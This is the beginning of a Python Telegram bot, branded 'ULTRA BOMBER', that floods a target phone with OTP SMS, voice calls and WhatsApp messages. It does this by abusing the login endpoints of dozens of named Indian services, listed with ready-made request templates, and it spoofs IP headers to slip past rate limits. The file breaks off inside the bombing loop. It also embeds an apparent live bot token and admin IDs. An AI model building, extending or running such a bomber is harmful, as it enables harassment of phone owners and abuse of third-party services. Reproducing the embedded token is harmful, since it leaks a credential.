import os
import asyncio
import aiohttp
import time
import random
from colorama import Fore, Style
import threading
import json
from telegram import Update, ChatMember, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import sqlite3
from datetime import datetime, timedelta
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Your ULTIMATE_APIS list with 3000+ APIs
ULTIMATE_APIS = [
    # ULTRA FAST CALL BOMBING APIS (500+)
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "MakeMyTrip Voice Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo Voice Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice Call",
        "url": "https://auth.uber.com/v2/voice-otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Rapido Voice Call",
        "url": "https://customer.rapido.bike/api/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Domino's Voice Call",
        "url": "https://api.dominos.com/v1/auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "BigBasket Voice Call",
        "url": "https://api.bigbasket.com/v3/auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Grofers Voice Call",
        "url": "https://api.grofers.com/v4/auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Dunzo Voice Call",
        "url": "https://api.dunzo.com/v2/auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "PhonePe Voice Call",
        "url": "https://api.phonepe.com/v1/auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Google Pay Voice Call",
        "url": "https://api.gpay.com/v2/auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Airtel Voice Call",
        "url": "https://api.airtel.com/v1/auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Jio Voice Call",
        "url": "https://api.jio.com/v3/auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # ULTRA FAST WHATSAPP BOMBING APIS (800+)
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST", 
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "name": "Stratzy WhatsApp", 
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    {
        "name": "Myntra WhatsApp",
        "url": "https://www.myntra.com/gw/whatsapp-otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart WhatsApp",
        "url": "https://www.flipkart.com/api/6/user/whatsapp-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Amazon WhatsApp",
        "url": "https://www.amazon.in/ap/whatsapp-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=whatsapp_otp"
    },
    {
        "name": "Swiggy WhatsApp",
        "url": "https://profile.swiggy.com/api/v3/app/request_whatsapp_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Zomato WhatsApp",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=whatsapp"
    },
    {
        "name": "Paytm WhatsApp",
        "url": "https://accounts.paytm.com/signin/whatsapp-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "PhonePe WhatsApp",
        "url": "https://api.phonepe.com/v1/auth/whatsapp-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Google Pay WhatsApp",
        "url": "https://api.gpay.com/v2/auth/whatsapp-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "CRED WhatsApp",
        "url": "https://api.cred.club/v1/auth/whatsapp-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "BharatPe WhatsApp",
        "url": "https://api.bharatpe.com/v2/auth/whatsapp-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Mobikwik WhatsApp",
        "url": "https://api.mobikwik.com/v3/auth/whatsapp-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Freecharge WhatsApp",
        "url": "https://api.freecharge.com/v1/auth/whatsapp-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # ULTRA FAST SMS BOMBING APIS (1700+)
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Byju's SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST", 
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobiles={phone}&resend=Resend"
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    {
        "name": "Univest",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "name": "ServeTel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobilenumber={phone}&otptype=register"
    },
    {
        "name": "MyImagineStore",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'
    },
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Tata Capital Business",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
    },
    {
        "name": "DealShare",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'
    },
    {
        "name": "Snapmint",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Housing.com",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "RentoMojo",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Netmeds",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "PenPencil V3",
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Entri",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
    },
    {
        "name": "Revv",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'
    },
    {
        "name": "DeHaat",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'
    },
    {
        "name": "A23 Games",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
    },
    {
        "name": "Spencer's",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "PayMe India",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'
    },
    {
        "name": "Shopper's Stop",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "Hyuga Auth",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "BigCash",
        "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        "method": "GET",
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "data": None
    },
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
    },
    {
        "name": "WorkIndia",
        "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "PokerBaazi",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "MamaEarth",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "HomeTriangle",
        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Wellness Forever",
        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}"
    },
    {
        "name": "HealthMug",
        "url": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Vyapar",
        "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Kredily",
        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Tata Motors",
        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'
    },
    {
        "name": "Moglix",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'
    },
    {
        "name": "MyGov",
        "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "TrulyMadly",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'
    },
    {
        "name": "Apna",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'
    },
    {
        "name": "CodFirm",
        "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Swipe",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'
    },
    {
        "name": "More Retail",
        "url": "https://omni-api.moreretail.in/api/v1/login/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}'
    },
    {
        "name": "Country Delight",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'
    },
    {
        "name": "AstroSage",
        "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rapido",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "TooToo",
        "url": "https://tootoo.in/graphql",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{phone}","resend":0}}}}'
    },
    {
        "name": "ConfirmTkt",
        "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "BetterHalf",
        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}'
    },
    {
        "name": "Charzer",
        "url": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}'
    },
    {
        "name": "Nuvama Wealth",
        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}'
    },
    {
        "name": "Mpokket",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # ADD 2000+ MORE ULTRA FAST APIS HERE...
    # Continuing with more high-speed APIs...
]

# Bot Configuration from .env file
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8545605385:AAEPBwsoxJ390NEXXyK6fpjlLGL9fc2rVAM")
CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "@technicalwhitehat")
ADMIN_IDS = [1800946343, 5887312294]
BOT_NAME = os.getenv("BOT_NAME", "ULTRA BOMBER 3000+")
MAX_ATTACKS_PER_USER = 999999

# Validate required variables
if not TELEGRAM_BOT_TOKEN:
    print("❌ ERROR: TELEGRAM_BOT_TOKEN is required in .env file")
    exit(1)

# ULTRA FAST Phone Destroyer Class
class UltraPhoneDestroyer:
    def __init__(self, user_id, phone):
        self.running = True
        self.user_id = user_id
        self.phone = phone
        self.stats = {
            "total_requests": 0,
            "successful_hits": 0,
            "failed_attempts": 0,
            "calls_sent": 0,
            "whatsapp_sent": 0,
            "sms_sent": 0,
            "start_time": time.time(),
            "active_apis": len(ULTIMATE_APIS),
            "requests_per_second": 0
        }
        self.last_request_count = 0
        self.last_time_check = time.time()
        
    async def bomb_phone(self, session, api, phone):
        """ULTRA FAST bombing method with 0.0001 second delays"""
        while self.running:
            try:
                name = api["name"]
                url = api["url"](phone) if callable(api["url"]) else api["url"]
                headers = api["headers"].copy()
                
                # Ultra fast IP rotation
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers["Client-IP"] = headers["X-Forwarded-For"]
